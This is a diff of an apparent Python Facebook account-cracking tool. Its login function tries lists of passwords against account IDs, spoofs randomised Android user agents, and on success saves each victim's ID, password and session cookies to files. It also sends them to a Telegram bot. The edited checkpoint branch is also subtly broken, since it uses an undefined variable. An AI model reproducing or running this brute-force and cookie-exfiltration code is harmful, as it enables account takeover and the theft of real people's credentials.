@@ -1039,19 +1039,20 @@ def PAKISTAN():
 #━━━━[ METHOD RANDOM ]━━━━#
 def m1(ids,pwv):
     global loop,oks,cps
-    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+   animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    ua =usragnt
-    pro = random.choice(usragent)
+    session=requests.Session()
+    ua = ua_valid()
     warna = random.choice(my_color)
+    sm2 =('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
+    ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            #session = httpx.Client()
-            free_fb = httpx.get(f"https://mbasic.facebook.com").text
-            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
-            update= {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+            free_fb = session.get('https://free.facebook.com').text
+            info={"jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),  "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),  "display": "", "isprivate": "", "return_session": "", "skip_api_login": "", "signed_next": "", "trynum": "1", "timezone": "420", "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=", "lgnrnd": "233842_bVRw", "lgnjs": "1719902322", "email": ids, "prefill_contact_point": "ids", "prefill_source": "browser_dropdown", "prefill_type": "password", "first_prefill_source": "browser_dropdown", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "true", "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ", "encpass": "#PWD_BROWSER:5:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
+            update={
+            'User-Agent': ua3,
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate, br',
@@ -1062,40 +1063,39 @@ def m1(ids,pwv):
             'Sec-Fetch-User': '?1',
             'Sec-Fetch-Dest': 'document',
             'Cache-Control': 'max-age=0',
-            'Referer': 'https://m.facebook.com/',
+            'Referer': 'https://lm.facebook.com/',
             'DNT': '1',
             'Pragma': 'no-cache',
             'TE': 'Trailers', }
-            response=httpx.post('https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data = info,headers = update)
-            log_cookies=httpx.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                kuki=";".join([f"{key}={httpx.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
-                cid = re.findall('c_user=(.*);xs',kuki)[0]
-                check =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
-                bithi = httpx.get(check).text
-                if 'LIVE' in bithi:
-                     print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                     print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
-                     statusok = (f" {cid} | {pas} | {kuki} ")
-                     #cek_apk(kuki)
-                     httpx.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                     open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
-                     oks.append(cid)
-                     break
+            session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = re.findall('c_user=(.*);xs',coki)[0]
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
+                        statusok = (f" {cid} | {pas} | {coki} ")
+                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')                        
+                        oks.append(cid)
+                        break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
-                uid = "1000"+coki1[0:11]
                 if 'y' in cp_xdx:
-                         print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{pas}')
-                         open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'|'+'\n')
-                         cps.append(uid)
+                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
+                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
+                        cps.append(uid)
             else:
                 continue
             time.sleep(0.01)
         loop+=1
- 
-    except:
+    except requests.exceptions.ConnectionError:
+        time.sleep(7)
+    except Exception as e:
         pass
 def m2(ids,pwv):
     global loop,oks,cps
